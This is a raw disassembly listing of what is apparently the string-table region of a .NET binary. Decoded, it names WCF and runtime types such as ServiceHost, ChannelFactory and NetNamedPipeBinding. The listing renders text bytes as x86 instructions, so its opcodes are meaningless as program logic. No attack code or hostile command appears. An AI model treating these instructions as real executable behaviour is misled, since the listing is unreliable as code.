  402db8:	gs jb  0x402de9
  402dbb:	inc    ebx
  402dbc:	outs   dx,DWORD PTR ds:[esi]
  402dbd:	ins    BYTE PTR es:[edi],dx
  402dbe:	ins    BYTE PTR es:[edi],dx
  402dbf:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402dc4:	outs   dx,BYTE PTR ds:[esi]
  402dc5:	cs push ebx
  402dc7:	gs jb  0x402e40
  402dca:	imul   esp,DWORD PTR [ebx+0x65],0x6c6f4300
  402dd1:	ins    BYTE PTR es:[edi],dx
  402dd2:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402dd7:	outs   dx,BYTE PTR ds:[esi]
  402dd8:	push   ebx
  402dd9:	gs jb  0x402e52
  402ddc:	imul   esp,DWORD PTR [ebx+0x65],0x63736d00
  402de3:	outs   dx,DWORD PTR ds:[esi]
  402de4:	jb     0x402e52
  402de6:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  402ded:	gs ins DWORD PTR es:[edi],dx
  402def:	add    BYTE PTR [edi+0x62],cl
  402df2:	push   0x65
  402df4:	arpl   WORD PTR [eax+eax*1+0x4d],si
  402df8:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402dff:	je     0x402e2f
  402e01:	inc    ebx
  402e02:	outs   dx,DWORD PTR ds:[esi]
  402e03:	outs   dx,BYTE PTR ds:[esi]
  402e04:	arpl   WORD PTR [ebp+0x72],si
  402e07:	jb     0x402e6e
  402e09:	outs   dx,BYTE PTR ds:[esi]
  402e0a:	arpl   WORD PTR [ecx+0x56],di
  402e0d:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  402e14:	gs jb  0x402e17
  402e17:	dec    ebp
  402e18:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402e1f:	je     0x402e4f
  402e21:	inc    ebx
  402e22:	outs   dx,DWORD PTR ds:[esi]
  402e23:	outs   dx,BYTE PTR ds:[esi]
  402e24:	arpl   WORD PTR [ebp+0x72],si
  402e27:	jb     0x402e8e
  402e29:	outs   dx,BYTE PTR ds:[esi]
  402e2a:	arpl   WORD PTR [ecx+0x56],di
  402e2d:	imul   esi,DWORD PTR [ebx+0x75],0x7a696c61
  402e34:	gs jb  0x402e65
  402e37:	inc    ebx
  402e38:	outs   dx,DWORD PTR ds:[esi]
  402e39:	ins    DWORD PTR es:[edi],dx
  402e3a:	ins    DWORD PTR es:[edi],dx
  402e3b:	outs   dx,DWORD PTR ds:[esi]
  402e3c:	outs   dx,BYTE PTR ds:[esi]
  402e3d:	add    BYTE PTR [ecx+0x43],cl
  402e40:	outs   dx,DWORD PTR ds:[esi]
  402e41:	ins    BYTE PTR es:[edi],dx
  402e42:	ins    BYTE PTR es:[edi],dx
  402e43:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402e48:	outs   dx,BYTE PTR ds:[esi]
  402e49:	push   ebx
  402e4a:	gs jb  0x402ec3
  402e4d:	imul   esp,DWORD PTR [ebx+0x65],0x6d6f6300
  402e54:	ins    DWORD PTR es:[edi],dx
  402e55:	popa   
  402e56:	outs   dx,BYTE PTR ds:[esi]
  402e57:	fs dec esp
  402e59:	imul   ebp,DWORD PTR [esi+0x65],0x65646f4d
  402e60:	add    BYTE PTR [edi+0x75],al
  402e63:	imul   esp,DWORD PTR [eax+eax*1+0x65],0x6f70646e
  402e6b:	imul   ebp,DWORD PTR [esi+0x74],0x53006449
  402e72:	jns    0x402ee7
  402e74:	je     0x402edb
  402e76:	ins    DWORD PTR es:[edi],dx
  402e77:	cs inc esp
  402e79:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402e80:	imul   esp,DWORD PTR [ebx+0x73],0x6f725000
  402e87:	arpl   WORD PTR [ebp+0x73],sp
  402e8a:	jae    0x402e8c
  402e8c:	jo     0x402eef
  402e8e:	jb     0x402ef5
  402e90:	outs   dx,BYTE PTR ds:[esi]
  402e91:	je     0x402ee3
  402e93:	jb     0x402f04
  402e95:	arpl   WORD PTR [ebp+0x73],sp
  402e98:	jae    0x402e9a
  402e9a:	push   ebx
  402e9b:	jns    0x402f10
  402e9d:	je     0x402f04
  402e9f:	ins    DWORD PTR es:[edi],dx
  402ea0:	cs push ebx
  402ea2:	arpl   WORD PTR gs:[ebp+0x72],si
  402ea6:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6e697250
  402eae:	arpl   WORD PTR [ecx+0x70],bp
  402eb1:	popa   
  402eb2:	ins    BYTE PTR es:[edi],dx
  402eb3:	add    BYTE PTR [ebx+0x65],dl
  402eb6:	arpl   WORD PTR [ebp+0x72],si
  402eb9:	imul   esi,DWORD PTR [ecx+edi*2+0x49],0x746e6564
  402ec1:	imul   esp,DWORD PTR [esi+0x69],0x61007265
  402ec8:	jne    0x402f3e
  402eca:	push   0x7a69726f
  402ecf:	gs fs push ebx
  402ed2:	imul   esp,DWORD PTR [eax+eax*1+0x4d],0x6e6961
  402eda:	push   ebp
  402edb:	jb     0x402f46
  402edd:	add    BYTE PTR [edi+0x65],al
  402ee0:	je     0x402f35
  402ee2:	gs jb  0x402f5b
  402ee5:	imul   esp,DWORD PTR [ebx+0x65],0x697255
  402eec:	push   eax
  402eed:	popa   
  402eee:	jb     0x402f63
  402ef0:	gs inc ecx
  402ef2:	jb     0x402f5b
  402ef4:	jne    0x402f63
  402ef6:	outs   dx,BYTE PTR gs:[esi]
  402ef8:	je     0x402f6d
  402efa:	inc    ecx
  402efb:	outs   dx,BYTE PTR ds:[esi]
  402efc:	fs dec ecx
  402efe:	outs   dx,BYTE PTR ds:[esi]
  402eff:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  402f07:	add    BYTE PTR [esi],ch
  402f09:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402f0d:	add    BYTE PTR [ebx+0x79],dl
  402f10:	jae    0x402f86
  402f12:	gs ins DWORD PTR es:[edi],dx
  402f14:	cs push esp
  402f16:	push   0x64616572
  402f1b:	imul   ebp,DWORD PTR [esi+0x67],0x7361542e
  402f22:	imul   esi,DWORD PTR [ebx+0x0],0x54
  402f26:	popa   
  402f27:	jae    0x402f94
  402f29:	inc    ebx
  402f2a:	outs   dx,DWORD PTR ds:[esi]
  402f2b:	ins    DWORD PTR es:[edi],dx
  402f2c:	jo     0x402f9a
  402f2e:	gs je  0x402f9a
  402f31:	outs   dx,DWORD PTR ds:[esi]
  402f32:	outs   dx,BYTE PTR ds:[esi]
  402f33:	push   ebx
  402f34:	outs   dx,DWORD PTR ds:[esi]
  402f35:	jne    0x402fa9
  402f37:	arpl   WORD PTR [ebp+0x60],sp
  402f3a:	xor    DWORD PTR [eax],eax
  402f3c:	push   0x4374736f
  402f41:	outs   dx,DWORD PTR ds:[esi]
  402f42:	ins    DWORD PTR es:[edi],dx
  402f43:	jo     0x402fb1
  402f45:	gs je  0x402fb1
  402f48:	outs   dx,DWORD PTR ds:[esi]
  402f49:	outs   dx,BYTE PTR ds:[esi]
  402f4a:	push   ebx
  402f4b:	outs   dx,DWORD PTR ds:[esi]
  402f4c:	jne    0x402fc0
  402f4e:	arpl   WORD PTR [ebp+0x0],sp
  402f51:	push   esp
  402f52:	popa   
  402f53:	jae    0x402fc0
  402f55:	add    BYTE PTR [edi+0x65],ah
  402f58:	je     0x402fb9
  402f5a:	inc    ebx
  402f5b:	outs   dx,DWORD PTR ds:[esi]
  402f5c:	ins    DWORD PTR es:[edi],dx
  402f5d:	jo     0x402fcb
  402f5f:	gs je  0x402fcb
  402f62:	outs   dx,DWORD PTR ds:[esi]
  402f63:	outs   dx,BYTE PTR ds:[esi]
  402f64:	push   esp
  402f65:	popa   
  402f66:	jae    0x402fd3
  402f68:	add    BYTE PTR [ebx+0x6f],al
  402f6b:	ins    BYTE PTR es:[edi],dx
  402f6c:	ins    BYTE PTR es:[edi],dx
  402f6d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402f72:	outs   dx,BYTE PTR ds:[esi]
  402f73:	push   ebx
  402f74:	je     0x402fd7
  402f76:	je     0x402fed
  402f78:	jae    0x402f7a
  402f7a:	inc    edi
  402f7b:	gs je  0x402fc1
  402f7e:	outs   dx,DWORD PTR ds:[esi]
  402f7f:	ins    BYTE PTR es:[edi],dx
  402f80:	ins    BYTE PTR es:[edi],dx
  402f81:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402f86:	outs   dx,BYTE PTR ds:[esi]
  402f87:	push   ebx
  402f88:	je     0x402feb
  402f8a:	je     0x403001
  402f8c:	jae    0x402f8e
  402f8e:	push   ebx
  402f8f:	je     0x403000
  402f91:	jo     0x402fd6
  402f93:	outs   dx,DWORD PTR ds:[esi]
  402f94:	ins    BYTE PTR es:[edi],dx
  402f95:	ins    BYTE PTR es:[edi],dx
  402f96:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402f9b:	outs   dx,BYTE PTR ds:[esi]
  402f9c:	push   ebx
  402f9d:	gs jb  0x403016
  402fa0:	imul   esp,DWORD PTR [ebx+0x65],0x6c6f4300
  402fa7:	ins    BYTE PTR es:[edi],dx
  402fa8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402fad:	outs   dx,BYTE PTR ds:[esi]
  402fae:	push   ebx
  402faf:	je     0x403012
  402fb1:	jb     0x403027
  402fb3:	push   edx
  402fb4:	gs jae 0x40302c
  402fb7:	ins    BYTE PTR es:[edi],dx
  402fb8:	je     0x402fba
  402fba:	push   esp
  402fbb:	jb     0x40301e
  402fbd:	arpl   WORD PTR [ebp+0x50],sp
  402fc0:	jb     0x403031
  402fc2:	jbe    0x40302d
  402fc4:	fs gs jb 0x40303b
  402fc8:	add    BYTE PTR [ebp+0x74],al
  402fcb:	ja     0x40300f
  402fcd:	jne    0x403035
  402fcf:	data16 gs jb 0x403026
  402fd3:	gs je  0x40304a
  402fd6:	imul   ebp,DWORD PTR [esi+0x67],0x74530073
  402fdd:	popa   
  402fde:	jb     0x403054
  402fe0:	push   esp
  402fe1:	jb     0x403044
  402fe3:	arpl   WORD PTR [ecx+0x6e],bp
  402fe6:	add    BYTE PTR [bp+di+0x6f],al
  402fea:	ins    BYTE PTR es:[edi],dx
  402feb:	ins    BYTE PTR es:[edi],dx
  402fec:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402ff1:	outs   dx,BYTE PTR ds:[esi]
  402ff2:	push   ebx
  402ff3:	je     0x403064
  402ff5:	jo     0x403049
  402ff7:	gs jae 0x40306f
  402ffa:	ins    BYTE PTR es:[edi],dx
  402ffb:	je     0x402ffd
  402ffd:	push   ebx
  402ffe:	je     0x40306f
  403000:	jo     0x403056
  403002:	jb     0x403065
  403004:	arpl   WORD PTR [ecx+0x6e],bp
  403007:	add    BYTE PTR [bp+0x6f],al
  40300b:	jb     0x403070
  40300d:	gs push ebx
  40300f:	je     0x403080
  403011:	jo     0x403067
  403013:	jb     0x403076
  403015:	arpl   WORD PTR [ecx+0x6e],bp
  403018:	add    BYTE PTR [si+0x69],al
  40301c:	jae    0x40307f
  40301e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x45]
  403022:	js     0x403089
  403024:	arpl   WORD PTR [ebp+0x74],si
  403027:	imul   esi,DWORD PTR [esi+0x65],0x69676150
  40302e:	outs   dx,BYTE PTR ds:[esi]
  40302f:	add    BYTE PTR [bx+0x65],al
  403033:	outs   dx,BYTE PTR ds:[esi]
  403034:	gs jb  0x403098
  403037:	je     0x40309e
  403039:	dec    esi
  40303a:	outs   dx,BYTE PTR gs:[si]
  40303d:	push   eax
  40303e:	bound  eax,QWORD PTR fs:[eax]
  403041:	inc    edi
  403042:	gs je  0x403095
  403045:	jb     0x4030b6
  403047:	arpl   WORD PTR [ebp+0x73],sp
  40304a:	jae    0x403099
  40304c:	popa   
  40304d:	imul   ebp,DWORD PTR [esi+0x41],0x6d657373
  403054:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403058:	push   eax
  403059:	imul   ebp,DWORD PTR [esi+0x67],0x6d6f4300
  403060:	jo     0x4030ce
  403062:	gs je  0x4030ce
  403065:	outs   dx,DWORD PTR ds:[esi]
  403066:	outs   dx,BYTE PTR ds:[esi]
  403067:	push   esp
  403068:	popa   
  403069:	jae    0x4030d6
  40306b:	add    BYTE PTR [ecx+0x72],ah
  40306e:	addr16 jae 0x403071
  403071:	jo     0x4030e5
  403073:	outs   dx,DWORD PTR ds:[esi]
  403074:	jbe    0x4030df
  403076:	fs gs jb 0x4030ed
  40307a:	add    BYTE PTR [edx+esi*2+0x61],dh
  40307e:	arpl   WORD PTR [ecx+0x6e],bp
  403081:	addr16 inc esp
  403083:	imul   esi,DWORD PTR [edx+0x0],0x63617274
  40308a:	gs inc esi
  40308c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x50656d61
  403094:	jb     0x4030fb
  403096:	imul   di,WORD PTR [eax+0x0],0x656b
  40309c:	jb     0x40310c
  40309e:	gs ins BYTE PTR es:[edi],dx
  4030a0:	inc    edx
  4030a1:	jne    0x403109
  4030a3:	data16 gs jb 0x4030fa
  4030a7:	gs je  0x40311e
  4030aa:	imul   ebp,DWORD PTR [esi+0x67],0x73750073
  4030b1:	gs jb  0x4030f6
  4030b4:	jne    0x40311c
  4030b6:	data16 gs jb 0x40310d
  4030ba:	gs je  0x403131
  4030bd:	imul   ebp,DWORD PTR [esi+0x67],0x616e0073
  4030c4:	je     0x40312f
  4030c6:	jbe    0x40312d
  4030c8:	dec    ecx
  4030c9:	ins    DWORD PTR es:[edi],dx
  4030ca:	popa   
  4030cb:	addr16 gs inc esi
  4030ce:	jne    0x40313c
  4030d0:	ins    BYTE PTR es:[edi],dx
  4030d1:	push   eax
  4030d2:	popa   
  4030d3:	je     0x40313d
  4030d5:	add    BYTE PTR [eax+0x64],dh
  4030d8:	bound  eax,QWORD PTR [ebp+eiz*2+0x73]
  4030dc:	je     0x4030de
  4030de:	jae    0x403159
  4030e0:	ins    DWORD PTR es:[edi],dx
  4030e1:	bound  ebp,QWORD PTR [edi+0x6c]
  4030e4:	push   eax
  4030e5:	popa   
  4030e6:	je     0x403150
  4030e8:	add    BYTE PTR [eax+0x69],dh
  4030eb:	add    BYTE PTR fs:[ebx+0x79],dl
  4030ef:	jae    0x403165
  4030f1:	gs ins DWORD PTR es:[edi],dx
  4030f3:	cs push edx
  4030f5:	jne    0x403165
  4030f7:	je     0x403162
  4030f9:	ins    DWORD PTR es:[edi],dx
  4030fa:	gs cs push esi
  4030fd:	gs jb  0x403173
  403100:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  403107:	push   esp
  403108:	popa   
  403109:	jb     0x403172
  40310b:	gs je  0x403154
  40310e:	jb     0x403171
  403110:	ins    DWORD PTR es:[edi],dx
  403111:	gs ja  0x403183
  403114:	jb     0x403181
  403116:	inc    ecx
  403117:	je     0x40318d
  403119:	jb     0x403184
  40311b:	bound  esi,QWORD PTR [ebp+0x74]
  40311e:	add    BYTE PTR gs:[ebx+0x79],dl
  403122:	jae    0x403198
  403124:	gs ins DWORD PTR es:[edi],dx
  403126:	cs push edx
  403128:	jne    0x403198
  40312a:	je     0x403195
  40312c:	ins    DWORD PTR es:[edi],dx
  40312d:	gs cs dec ecx
  403130:	outs   dx,BYTE PTR ds:[esi]
  403131:	je     0x403198
  403133:	jb     0x4031a4
  403135:	jo     0x40318a
  403137:	gs jb  0x4031b0
  40313a:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  403141:	ins    DWORD PTR es:[edi],dx
  403142:	push   esi
  403143:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  40314a:	je     0x4031c0
  40314c:	jb     0x4031b7
  40314e:	bound  esi,QWORD PTR [ebp+0x74]
  403151:	add    BYTE PTR gs:[ebx+0x4c],al
  403155:	push   ebx
  403156:	inc    ebx
  403157:	outs   dx,DWORD PTR ds:[esi]
  403158:	ins    DWORD PTR es:[edi],dx
  403159:	jo     0x4031c7
  40315b:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  403162:	jb     0x4031cd
  403164:	bound  esi,QWORD PTR [ebp+0x74]
  403167:	add    BYTE PTR gs:[ebx+0x79],dl
  40316b:	jae    0x4031e1
  40316d:	gs ins DWORD PTR es:[edi],dx
  40316f:	cs push edx
  403171:	gs data16 ins BYTE PTR es:[edi],dx
  403174:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403179:	outs   dx,BYTE PTR ds:[esi]
  40317a:	add    BYTE PTR [ecx+0x73],al
  40317d:	jae    0x4031e4
  40317f:	ins    DWORD PTR es:[edi],dx
  403180:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  403184:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  40318c:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403193:	jae    0x403208
  403195:	gs ins DWORD PTR es:[edi],dx
  403197:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40319b:	gs jae 0x403201
  40319e:	jb     0x403209
  4031a0:	jo     0x403216
  4031a2:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4031a9:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4031b0:	jae    0x403225
  4031b2:	gs ins DWORD PTR es:[edi],dx
  4031b4:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4031b8:	gs popaw 
  4031bb:	jne    0x403229
  4031bd:	je     0x403200
  4031bf:	ins    BYTE PTR es:[edi],dx
  4031c0:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  4031c7:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4031ce:	jae    0x403243
  4031d0:	gs ins DWORD PTR es:[edi],dx
  4031d2:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4031d6:	outs   dx,DWORD PTR ds:[esi]
  4031d7:	ins    DWORD PTR es:[edi],dx
  4031d8:	jo     0x40323b
  4031da:	outs   dx,BYTE PTR ds:[esi]
  4031db:	jns    0x40321e
  4031dd:	je     0x403253
  4031df:	jb     0x40324a
  4031e1:	bound  esi,QWORD PTR [ebp+0x74]
  4031e4:	add    BYTE PTR gs:[ecx+0x73],al
  4031e8:	jae    0x40324f
  4031ea:	ins    DWORD PTR es:[edi],dx
  4031eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  4031ef:	jb     0x403260
  4031f1:	fs jne 0x403257
  4031f4:	je     0x403237
  4031f6:	je     0x40326c
  4031f8:	jb     0x403263
  4031fa:	bound  esi,QWORD PTR [ebp+0x74]
  4031fd:	add    BYTE PTR gs:[ecx+0x73],al
  403201:	jae    0x403268
  403203:	ins    DWORD PTR es:[edi],dx
  403204:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403208:	outs   dx,DWORD PTR ds:[esi]
  403209:	jo     0x403284
  40320b:	jb     0x403276
  40320d:	addr16 push 0x74744174
  403213:	jb     0x40327e
  403215:	bound  esi,QWORD PTR [ebp+0x74]
  403218:	add    BYTE PTR gs:[ecx+0x73],al
  40321c:	jae    0x403283
  40321e:	ins    DWORD PTR es:[edi],dx
  40321f:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  403223:	gs jb  0x403299
  403226:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40322d:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403234:	jae    0x4032a9
  403236:	gs ins DWORD PTR es:[edi],dx
  403238:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  40323c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  403244:	outs   dx,DWORD PTR ds:[esi]
  403245:	outs   dx,BYTE PTR ds:[esi]
  403246:	inc    ecx
  403247:	je     0x4032bd
  403249:	jb     0x4032b4
  40324b:	bound  esi,QWORD PTR [ebp+0x74]
  40324e:	add    BYTE PTR gs:[ecx+0x73],al
  403252:	jae    0x4032b9
  403254:	ins    DWORD PTR es:[edi],dx
  403255:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  403259:	outs   dx,BYTE PTR ds:[esi]
  40325a:	outs   dx,WORD PTR ds:[esi]
  40325c:	jb     0x4032cb
  40325e:	popa   
  40325f:	je     0x4032ca
  403261:	outs   dx,DWORD PTR ds:[esi]
  403262:	outs   dx,BYTE PTR ds:[esi]
  403263:	popa   
  403264:	ins    BYTE PTR es:[edi],dx
  403265:	push   esi
  403266:	gs jb  0x4032dc
  403269:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403270:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  403277:	jns    0x4032ec
  403279:	je     0x4032e0
  40327b:	ins    DWORD PTR es:[edi],dx
  40327c:	cs push edx
  40327e:	gs jae 0x4032f0
  403281:	jne    0x4032f5
  403283:	arpl   WORD PTR [ebp+0x73],sp
  403286:	add    BYTE PTR [ebx+0x61],dl
  403289:	je     0x4032f0
  40328b:	ins    BYTE PTR es:[edi],dx
  40328c:	ins    BYTE PTR es:[edi],dx
  40328d:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  403295:	popa   
  403296:	arpl   WORD PTR [esi+edx*2+0x65],si
  40329a:	jb     0x40330f
  40329c:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4032a3:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  4032aa:	gs jne 0x403321
  4032ad:	jb     0x403310
  4032af:	ins    BYTE PTR es:[edi],dx
  4032b0:	push   edx
  4032b1:	gs jae 0x403323
  4032b4:	jne    0x403328
  4032b6:	arpl   WORD PTR [ebp+0x73],sp
  4032b9:	dec    esp
  4032ba:	popa   
  4032bb:	outs   dx,BYTE PTR ds:[esi]
  4032bc:	addr16 jne 0x403320
  4032bf:	addr16 gs inc ecx
  4032c2:	je     0x403338
  4032c4:	jb     0x40332f
  4032c6:	bound  esi,QWORD PTR [ebp+0x74]
  4032c9:	add    BYTE PTR gs:[ecx+0x73],al
  4032cd:	jae    0x403334
  4032cf:	ins    DWORD PTR es:[edi],dx
  4032d0:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4032d4:	gs ins BYTE PTR es:[edi],dx
  4032d6:	popa   
  4032d7:	jns    0x40332c
  4032d9:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  4032e0:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4032e7:	jae    0x40335c
  4032e9:	gs ins DWORD PTR es:[edi],dx
  4032eb:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  4032ef:	gs jns 0x403338
  4032f2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4032fa:	bound  esi,QWORD PTR [ebp+0x74]
  4032fd:	add    BYTE PTR gs:[ecx+0x73],al
  403301:	jae    0x403368
  403303:	ins    DWORD PTR es:[edi],dx
  403304:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  403308:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  40330f:	gs dec ebx
  403311:	gs jns 0x403355
  403314:	je     0x40338a
  403316:	jb     0x403381
  403318:	bound  esi,QWORD PTR [ebp+0x74]
  40331b:	add    BYTE PTR gs:[ebx+0x79],dl
  40331f:	jae    0x403395
  403321:	gs ins DWORD PTR es:[edi],dx
  403323:	cs push edx
  403325:	jne    0x403395
  403327:	je     0x403392
  403329:	ins    DWORD PTR es:[edi],dx
  40332a:	gs cs inc ebx
  40332d:	outs   dx,DWORD PTR ds:[esi]
  40332e:	ins    DWORD PTR es:[edi],dx
  40332f:	jo     0x40339a
  403331:	ins    BYTE PTR es:[edi],dx
  403332:	gs jb  0x403388
  403335:	gs jb  0x4033ae
  403338:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  40333f:	outs   dx,BYTE PTR ds:[esi]
  403340:	je     0x4033ab
  403342:	ins    DWORD PTR es:[edi],dx
  403343:	gs inc ebx
  403345:	outs   dx,DWORD PTR ds:[esi]
  403346:	ins    DWORD PTR es:[edi],dx
  403347:	jo     0x4033aa
  403349:	je     0x4033b4
  40334b:	bound  ebp,QWORD PTR [ecx+0x6c]
  40334e:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  403356:	bound  esi,QWORD PTR [ebp+0x74]
  403359:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40335e:	jne    0x4033c7
  403360:	addr16 popa 
  403362:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403366:	je     0x4033dc
  403368:	jb     0x4033d3
  40336a:	bound  esi,QWORD PTR [ebp+0x74]
  40336d:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  403372:	jne    0x4033db
  403374:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  40337c:	jae    0x40337e
  40337e:	inc    ebx
  40337f:	outs   dx,DWORD PTR ds:[esi]
  403380:	ins    DWORD PTR es:[edi],dx
  403381:	jo     0x4033ec
  403383:	ins    BYTE PTR es:[edi],dx
  403384:	popa   
  403385:	je     0x4033f0
  403387:	outs   dx,DWORD PTR ds:[esi]
  403388:	outs   dx,BYTE PTR ds:[esi]
  403389:	push   edx
  40338a:	gs ins BYTE PTR es:[edi],dx
  40338c:	popa   
  40338d:	js     0x4033f0
  40338f:	je     0x4033fa
  403391:	outs   dx,DWORD PTR ds:[esi]
  403392:	outs   dx,BYTE PTR ds:[esi]
  403393:	jae    0x4033d6
  403395:	je     0x40340b
  403397:	jb     0x403402
  403399:	bound  esi,QWORD PTR [ebp+0x74]
  40339c:	add    BYTE PTR gs:[ebx+0x56],al
  4033a0:	inc    ebx
  4033a1:	outs   dx,DWORD PTR ds:[esi]
  4033a2:	ins    BYTE PTR es:[edi],dx
  4033a3:	ins    BYTE PTR es:[edi],dx
  4033a4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4033a9:	outs   dx,BYTE PTR ds:[esi]
  4033aa:	push   ebx
  4033ab:	gs jb  0x403424
  4033ae:	imul   esp,DWORD PTR [ebx+0x65],0x766e4500
  4033b5:	imul   esi,DWORD PTR [edx+0x6f],0x6e656d6e
  4033bc:	je     0x4033be
  4033be:	inc    ebp
  4033bf:	js     0x40342a
  4033c1:	je     0x4033c3
  4033c3:	push   ebx
  4033c4:	jns    0x403439
  4033c6:	je     0x40342d
  4033c8:	ins    DWORD PTR es:[edi],dx
  4033c9:	cs push ebx
  4033cb:	gs jb  0x403444
  4033ce:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  4033d5:	ins    BYTE PTR es:[edi],dx
  4033d6:	add    BYTE PTR [ebx+0x65],dl
  4033d9:	jb     0x403451
  4033db:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  4033e2:	add    BYTE PTR [esi+0x65],cl
  4033e5:	je     0x403435
  4033e7:	popa   
  4033e8:	ins    DWORD PTR es:[edi],dx
  4033e9:	gs fs push eax
  4033ec:	imul   esi,DWORD PTR [eax+0x65],0x646e6942
  4033f3:	imul   ebp,DWORD PTR [esi+0x67],0x6d695400
  4033fa:	gs push ebx
  4033fc:	jo     0x40345f
  4033fe:	outs   dx,BYTE PTR ds:[esi]
  4033ff:	add    BYTE PTR [ebp+0x61],cl
  403402:	js     0x40345a
  403404:	popa   
  403405:	ins    BYTE PTR es:[edi],dx
  403406:	jne    0x40346d
  403408:	add    BYTE PTR [ebx+0x79],dl
  40340b:	jae    0x403481
  40340d:	gs ins DWORD PTR es:[edi],dx
  40340f:	cs push ebx
  403411:	gs jb  0x40348a
  403414:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40341b:	ins    BYTE PTR es:[edi],dx
  40341c:	cs inc ebx
  40341e:	push   0x656e6e61
  403423:	ins    BYTE PTR es:[edi],dx
  403424:	jae    0x403426
  403426:	inc    edx
  403427:	imul   ebp,DWORD PTR [esi+0x64],0x676e69
  40342e:	jae    0x403495
  403430:	je     0x403491
  403432:	push   edx
  403433:	arpl   WORD PTR gs:[ebp+0x69],sp
  403437:	jbe    0x40349e
  403439:	push   esp
  40343a:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  403441:	push   esp
  403442:	jns    0x4034b4
  403444:	add    BYTE PTR gs:[edx+0x75],dl
  403448:	outs   dx,BYTE PTR ds:[esi]
  403449:	je     0x4034b4
  40344b:	ins    DWORD PTR es:[edi],dx
  40344c:	gs push esp
  40344e:	jns    0x4034c0
  403450:	gs dec eax
  403452:	popa   
  403453:	outs   dx,BYTE PTR ds:[esi]
  403454:	fs ins BYTE PTR es:[edi],dx
  403456:	add    BYTE PTR gs:[edi+0x65],al
  40345a:	je     0x4034b0
  40345c:	jns    0x4034ce
  40345e:	gs inc esi
  403460:	jb     0x4034d1
  403462:	ins    DWORD PTR es:[edi],dx
  403463:	dec    eax
  403464:	popa   
  403465:	outs   dx,BYTE PTR ds:[esi]
  403466:	fs ins BYTE PTR es:[edi],dx
  403468:	add    BYTE PTR gs:[ebx+0x79],dl
  40346c:	jae    0x4034e2
  40346e:	gs ins DWORD PTR es:[edi],dx
  403470:	cs push ebx
  403472:	gs jb  0x4034eb
  403475:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  40347c:	ins    BYTE PTR es:[edi],dx
  40347d:	cs inc esp
  40347f:	gs jae 0x4034e5
  403482:	jb     0x4034ed
  403484:	jo     0x4034fa
  403486:	imul   ebp,DWORD PTR [edi+0x6e],0x72655300
  40348d:	jbe    0x4034f8
  40348f:	arpl   WORD PTR [ebp+0x45],sp
  403492:	outs   dx,BYTE PTR ds:[esi]
  403493:	fs jo  0x403505
  403496:	imul   ebp,DWORD PTR [esi+0x74],0x64644100
  40349d:	push   ebx
  40349e:	gs jb  0x403517
  4034a1:	imul   esp,DWORD PTR [ebx+0x65],0x70646e45
  4034a8:	outs   dx,DWORD PTR ds:[esi]
  4034a9:	imul   ebp,DWORD PTR [esi+0x74],0x72655300
